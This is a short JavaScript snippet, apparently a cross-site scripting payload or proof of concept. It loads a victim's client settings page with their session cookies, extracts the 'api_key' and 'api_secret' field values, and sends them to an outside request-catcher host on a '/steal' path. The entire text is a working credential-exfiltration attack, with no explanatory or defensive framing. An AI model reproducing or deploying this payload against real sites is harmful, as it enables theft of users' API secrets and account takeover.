fetch("/client/settings/configuration", {credentials:"include"})
  .then(r=>r.text())
  .then(h=>{
    let d=new DOMParser().parseFromString(h,"text/html");
    let k=d.querySelector('input[name="api_key"]')?.value;
    let s=d.querySelector('input[name="api_secret"]')?.value;
    if(k&&s){
      fetch(`https://secuna_seapower.requestcatcher.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`);
    }
  });
